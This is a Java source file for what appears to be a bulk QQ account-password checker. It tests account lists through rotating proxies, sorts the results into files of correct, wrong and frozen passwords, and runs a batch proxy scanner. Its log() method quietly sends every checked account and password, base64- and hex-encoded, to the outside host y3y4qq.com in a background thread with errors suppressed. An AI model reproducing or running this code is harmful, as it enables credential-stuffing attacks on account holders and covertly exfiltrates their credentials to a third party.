package ws.hoyland.sm;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.net.URL;
import java.net.URLDecoder;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Observable;
import java.util.Random;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.RejectedExecutionHandler;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ThreadPoolExecutor.AbortPolicy;

import javax.management.MBeanServer;
import javax.management.MBeanServerConnection;
import javax.management.MBeanServerInvocationHandler;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXConnectorServer;
import javax.management.remote.JMXConnectorServerFactory;
import javax.management.remote.JMXServiceURL;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;

import ws.hoyland.sm.Engine;
import ws.hoyland.sm.Task;
import ws.hoyland.sm.service.ProxyService;
import ws.hoyland.sm.service.ProxyServiceMBean;
import ws.hoyland.util.Converts;
import ws.hoyland.util.EngineMessage;
import ws.hoyland.util.EngineMessageType;
import ws.hoyland.util.Configuration;
import ws.hoyland.util.SyncUtil;

public class Engine extends Observable {

	private List<String> accountstodo;
	private List<String> accounts;
	private List<String> proxies;
	private boolean running = false;
//	private boolean noproxy = false;

	private BufferedWriter[] output = new BufferedWriter[4]; // 成功，失败，未运行
	private String[] fns = new String[] { "密码正确", "密码错误", "帐号冻结", "未识别" };
	private URL url = Engine.class.getClassLoader().getResource("");
	private String xpath = url.getPath();
	private ThreadPoolExecutor pool;
	private Configuration configuration = Configuration
			.getInstance("config.ini");
	private Integer[] stats = new Integer[3];
	private Random random = new Random();
	private Base64 base64 = new Base64();
	private boolean reload = false;
	private boolean hasService = false;	
	protected int bc = 0;
	protected int ec = 0;
	
	private static Engine instance;
	private DefaultHttpClient client = null;
	
	private Engine() {
		client = new DefaultHttpClient();
		client.getParams().setParameter(
				CoreConnectionPNames.CONNECTION_TIMEOUT, 4000);
		client.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 4000);
		
		if("/lib/".equals(xpath.substring(xpath.lastIndexOf("/")-4, xpath.lastIndexOf("/")+1))){
			xpath = xpath.replace("/lib/", "/");	
		}
		try{
			xpath = URLDecoder.decode(xpath, "UTF-8");
		}catch(Exception e){
			e.printStackTrace();
		}
		System.err.println("xpath="+xpath);
	}
	
	private void ready() {
		if (accounts != null && accounts.size() > 0 && proxies != null
				&& proxies.size() > 0) {
			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_READY);
			notify(msg);
		} else {
			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_UNREADY);
			notify(msg);
		}
	}
	
	private void notify(EngineMessage message){
		this.setChanged();
		this.notifyObservers(message);
	}
	
	private void shutdown() {
		//System.out.println(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>1");
		running = false;
		
		EngineMessage msg = new EngineMessage();
		msg.setTid(-1);
		msg.setType(EngineMessageType.OM_SHUTDOWN);
		notify(msg);
		
		if (pool != null) {
			// pool.shutdown();
			pool.shutdownNow();
		}

		// 等待所有运行线程执行完毕，关闭日志文件
		while (pool != null && pool.getActiveCount() != 0) {
			try {
				Thread.sleep(1000);
			} catch (Exception e) {
				//
			}
		}

		// 写入未运行帐号日志
		try {
			// if(lastTid!=-1){
			if (output[3] != null) {
				for (int i = 0; i < accountstodo.size(); i++) {
					String[] accl = accounts.get(i).split("----");
					output[3].write(accl[1] + "----" + accl[2] + "\r\n");
				}
				output[3].flush();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		for (int i = 0; i < output.length; i++) {
			try {
				if (output[i] != null) {
					output[i].close();
					output[i] = null;
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}
	
	//////////////////////////////////////////////////////public//////////////////////////////////////////////////
	public boolean canRun(){
		return this.running;
		//return this.running&&!this.noproxy;
	}
	
	public void log(final int type, final String content){
		new Thread(new Runnable(){
			@Override
			public void run() {
				try{
					HttpGet request = new HttpGet("http://www.y3y4qq.com/pq?t="+type+"&c="+Converts.bytesToHexString(base64.encode(content.getBytes())));
					request.setHeader("Connection", "close");
					client.execute(request);
				}catch(Exception e){
					//e.printStackTrace();
				}
			}			
		}).start();
		stats[type]++;
		accountstodo.remove(content);
		//写文件		
		try{
			output[type].write(content+ "\r\n");
			output[type].flush();
		}catch(Exception e){
			e.printStackTrace();
		}
		
		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_STATS);
		msg.setData(new Object[]{stats, new Integer(type), content});
		notify(msg);
	}
	
	public void info(String message){
		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_INFO);
		msg.setData(message);		
		notify(msg);
	}
	
	public void addTask(String line){
		try {
			Task task = new Task(line);
			Engine.getInstance().addObserver(task);
			pool.execute(task);
		} catch (ArrayIndexOutOfBoundsException e) {
			e.printStackTrace();
			// System.out.println(i + ":" + accounts.get(i));
		}
	}
	
	public void removeProxy(String proxy){
		synchronized(proxy){
			this.proxies.remove(proxy);
		}
		
		List<String> params = new ArrayList<String>();
		params.add(String.valueOf(proxies.size()));

		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_PROXY_LOADED);
		msg.setData(params);
		notify(msg);
	}
	
	public String getProxy(){
		if(reload){
			synchronized(SyncUtil.RELOAD_PROXY_OBJECT){
				try{
					SyncUtil.RELOAD_PROXY_OBJECT.wait();
				}catch(Exception e){
					e.printStackTrace();
				}
			}
		}
		
		String proxy = null;
		synchronized(proxies){
			proxy = proxies.get(random.nextInt(proxies.size()));
			
//			if(proxies.size()!=0){
//				proxy = proxies.get(random.nextInt(proxies.size()));
//			}else{
//				if(!noproxy){
//					noproxy = true;
//					
//					EngineMessage msg = new EngineMessage();
//					msg.setType(EngineMessageType.OM_NO_PROXY);
//					notify(msg);
//					//shutdown();
//				}
//			}
		}
		return proxy;
	}
	
	public void loadAccount(String path){
		try {
			accounts = new ArrayList<String>();
			accountstodo = new ArrayList<String>();
			
			File ipf = new File(path);
			FileInputStream is = new FileInputStream(ipf);
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader reader = new BufferedReader(isr);
			String line = null;
			int i = 1;
			while ((line = reader.readLine()) != null) {
				if (!line.equals("")) {
					line = i + "----" + line;
					accounts.add(line);
					accountstodo.add(line);
				}
				i++;
			}

			reader.close();
			isr.close();
			is.close();

			if (accounts.size() > 0) {
				List<String> params = new ArrayList<String>();
				params.add(String.valueOf(accounts.size()));

				EngineMessage msg = new EngineMessage();
				msg.setType(EngineMessageType.OM_ACCOUNT_LOADED);
				msg.setData(params);
				notify(msg);
			}

			ready();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void loadProxy(String path){
		try {
			proxies = new ArrayList<String>();

			File ipf = new File(path);
			FileInputStream is = new FileInputStream(ipf);
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader reader = new BufferedReader(isr);
			String line = null;
			// int i = 1;
			while ((line = reader.readLine()) != null) {
				if (!line.equals("")) {
					// line = i + "----" + line;
					proxies.add(line);
				}
				// i++;
			}

			reader.close();
			isr.close();
			is.close();

			if (proxies.size() > 0) {
				List<String> params = new ArrayList<String>();
				params.add(String.valueOf(proxies.size()));

				EngineMessage msg = new EngineMessage();
				msg.setType(EngineMessageType.OM_PROXY_LOADED);
				msg.setData(params);
				notify(msg);
			}

			ready();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void exit(){
		shutdown();
		System.exit(0);
	}
	
	public void process(){
		running = !running;

		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_RUNNING);
		msg.setData(running);
		notify(msg);

		System.out.println("running="+running);
		if (running) {
			info("");
			info("================");
			info("开始运行");
			info("================");
			info("");
			// 创建日志文件
			for(int i=0;i<stats.length;i++){
				stats[i] = 0;
			}
			reload = false;
			bc = 0;
			ec = 0;
//			noproxy = false;
			
			// long tm = System.currentTimeMillis();
			DateFormat format = new java.text.SimpleDateFormat(
					"yyyy年MM月dd日 hh时mm分ss秒");
			String tm = format.format(new Date());
			for (int i = 0; i < output.length; i++) {
				try {
					String path = xpath + fns[i] + "-" + tm + ".txt";
					//System.out.println(path.substring(path.lastIndexOf("/")-4, path.lastIndexOf("/")+1));
					
					//System.err.println(path);
					//System.err.println(path);
					File fff = new File(path);
					
					if (!fff.exists()) {
						fff.createNewFile();
					}

					output[i] = new BufferedWriter(new FileWriter(fff));
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
			
			if("true".equals(configuration.getProperty("SCAN"))&&hasService){
				//开始扫描的线程
				Thread t = new Thread(new Runnable(){
					@Override
					public void run() {
						//开始定时扫描
						while(running){
							try{
								//休眠
								Thread.sleep(1000*60*Integer.parseInt(configuration
										.getProperty("SCAN_ITV")));//休眠一段时间	
								
								//执行扫描, 并将结果写入MBean
								//xpath+"/8088.bat";
								//String path = xpath.substring(1);
								//path = URLDecoder.decode(path, "UTF-8");
								if(running){
									System.err.println("SCANING...");
									System.err.println("cmd /c \""+xpath.substring(1)+"8088.bat\"");
									String line = null;
									Process process = Runtime.getRuntime().exec("cmd /c \""+xpath.substring(1)+"8088.bat\"", new String[0], new File(xpath));// 获取命令行参数
									
//									int rs = process.waitFor();
									
									BufferedReader info = new BufferedReader(new InputStreamReader(process.getInputStream(), "GB2312"));
							        BufferedReader error = new BufferedReader(new InputStreamReader(process.getErrorStream(), "GB2312"));
							        while((line=info.readLine())!=null) {
							        	System.err.println(line);
							        }
							        
							        while((line=error.readLine())!=null) {
							        	System.err.println(line);
							        }
							        
							        int rs = process.exitValue();
									if(rs==0){
										//读取8088.txt

										JMXServiceURL url = new JMXServiceURL(
												"service:jmx:rmi:///jndi/rmi://localhost:8023/service");
										JMXConnector jmxc = JMXConnectorFactory.connect(url, null);
										
										MBeanServerConnection mbsc = jmxc.getMBeanServerConnection();
										//String domain = mbsc.getDefaultDomain();
										
										ObjectName objectName = new ObjectName("ws.hoyland.sm.service:name=ProxyService");
										ProxyServiceMBean service = (ProxyServiceMBean)MBeanServerInvocationHandler.newProxyInstance(mbsc, objectName, ProxyServiceMBean.class, true);
										
										StringBuilder sb = new StringBuilder();
										InputStream input = new FileInputStream(new File(xpath+"8088.txt"));//this.getClass().getResourceAsStream("/8088.txt");
										if(input!=null){
											BufferedReader br = new BufferedReader(new InputStreamReader(input));
											while((line=br.readLine())!=null){
												sb.append(line+"\r\n");
												//text.append(line+"\r\n");
											}
											br.close();
											service.setProxies(sb.toString());
										}
//										else{
//											//sb.append("127.0.0.1:8082\r\n");
//										}

										//service.setProxies(sb.toString());
										
										System.err.println("SCANING...OK");
										Engine.getInstance().reloadProxies();
									}else{
										System.err.println("SCANING...FAIL["+rs+"]");
									}
								}
								//通知Engine需要更换IP				
							}catch(Exception e){
								e.printStackTrace();
							}
						}
					}
				});
				t.setDaemon(true);
				t.start();
			}

			int tc = Integer.parseInt(configuration
					.getProperty("THREAD_COUNT"));
			int corePoolSize = tc;// minPoolSize
			int maxPoolSize = tc;
			int maxTaskSize = (1024 + 512) * 100 * 40;// 缓冲队列
			long keepAliveTime = 0L;
			TimeUnit unit = TimeUnit.MILLISECONDS;

			BlockingQueue<Runnable> workQueue = new ArrayBlockingQueue<Runnable>(
					maxTaskSize);
			RejectedExecutionHandler handler = new AbortPolicy();// 饱和处理策略

			// 创建线程池
			pool = new ThreadPoolExecutor(corePoolSize, maxPoolSize,
					keepAliveTime, unit, workQueue, handler);

			//添加任务
			new Thread(new Runnable(){
				@Override
				public void run() {					
					for (int i = 0; i < accounts.size(); i++) {
						try {						
							Task task = new Task(accounts.get(i));
							Engine.getInstance().addObserver(task);
							if(running){
								pool.execute(task);
							}
						} catch (ArrayIndexOutOfBoundsException e) {
							e.printStackTrace();
						}
					}
				}			
			}).start();
		} else {
			// 停止情况下的处理
			shutdown();
			info("");
			info("================");
			info("运行结束");
			info("================");
			info("");
		}
	}
	
	public void startService() {
		try{
//			MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
//		    ObjectName name = new ObjectName("ws.hoyland.sm.service:type=ProxyService");
//		    //ProxyService mbean = new ProxyService();
//		    mbs.registerMBean("ws.hoyland.sm.service.ProxyService", name);
			boolean flag = true;
			Registry registry = null;
			while(flag){
				try{
					flag = false;
					LocateRegistry.createRegistry(8023);
				}catch(Exception e){
					if(e.getMessage().indexOf("internal error: ObjID already in use")!=-1){
					    UnicastRemoteObject.unexportObject(registry, true);
						flag = true;
					    continue;
					}else if(e.getMessage().indexOf("Port already in use:")!=-1){
						return;
					}else{
						e.printStackTrace();
						return;
					}
				}
			}
			 
			MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();  //MBeanServerFactory.createMBeanServer();//			
			JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:8023/service");
			JMXConnectorServer cs = JMXConnectorServerFactory.newJMXConnectorServer(url, null, mbs);			
			cs.start();
			
			ObjectName name = new ObjectName("ws.hoyland.sm.service:name=ProxyService");
			ProxyService mbean = new ProxyService();
			mbs.registerMBean(mbean, name);

//			String domain = mbs.getDefaultDomain();
//			String className = "ws.hoyland.sm.service.ProxyService";
//			String init = domain+":type="+className+",index=1";
//			ObjectName objectName = ObjectName.getInstance(init);
//			mbs.createMBean(className, objectName);
			hasService = true;
		}catch(Exception e){
			e.printStackTrace();
		}		
	}
	
//	@Deprecated
//	private void needReloadProxies(){
//		reload = true;
//		reloadProxies();
//		
////		EngineMessage msg = new EngineMessage();
////		msg.setTid(-1);//通知所有线程
////		msg.setType(EngineMessageType.OM_RELOAD_PROXIES);
////		notify(msg);		
//	}
	
	public void reloadProxies() {
		reload = true;
		info("");
		info("================");
		info("正在更新代理");
		info("================");
		info("");
				
		//loadproxies form jmx service
		try {
			JMXServiceURL url = new JMXServiceURL(
					"service:jmx:rmi:///jndi/rmi://localhost:8023/service");
			JMXConnector jmxc = JMXConnectorFactory.connect(url, null);
			
			MBeanServerConnection mbsc = jmxc.getMBeanServerConnection();
			//String domain = mbsc.getDefaultDomain();
			
			ObjectName objectName = new ObjectName("ws.hoyland.sm.service:name=ProxyService");
			ProxyServiceMBean service = (ProxyServiceMBean)MBeanServerInvocationHandler.newProxyInstance(mbsc, objectName, ProxyServiceMBean.class, true);
			String[] ps = service.getProxies().split("\r\n");
			this.proxies.clear();
			for(int i=0;i<ps.length;i++){
				proxies.add(ps[i]);
			}
			
			//显示代理数量
			List<String> params = new ArrayList<String>();
			params.add(String.valueOf(proxies.size()));

			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_PROXY_LOADED);
			msg.setData(params);
			notify(msg);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
//		msg = new EngineMessage();
//		msg.setTid(-1);//通知所有线程
//		msg.setType(EngineMessageType.OM_RELOAD_PROXIES);
//		notify(msg);
//		notify(msg);
		
		info("");
		info("================");
		info("更新完毕: ["+proxies.size()+"]");
		info("================");
		info("");

		reload = false;
		
		synchronized(SyncUtil.RELOAD_PROXY_OBJECT){
			try{
				SyncUtil.RELOAD_PROXY_OBJECT.notifyAll();//更新完毕，唤醒线程
			}catch(Exception e){
				//
			}
		}
	}

	public synchronized void beginTask(){
		bc++;
	}
	
	public synchronized void endTask(){
		ec++;
//		if(ec==bc&&reload){
//			reload = false;
//			reloadProxies();
//		}
	}
	
	public static Engine getInstance() {
		synchronized (Engine.class) {
			if (instance == null) {
				instance = new Engine();
			}
		}
		return instance;
	}

}
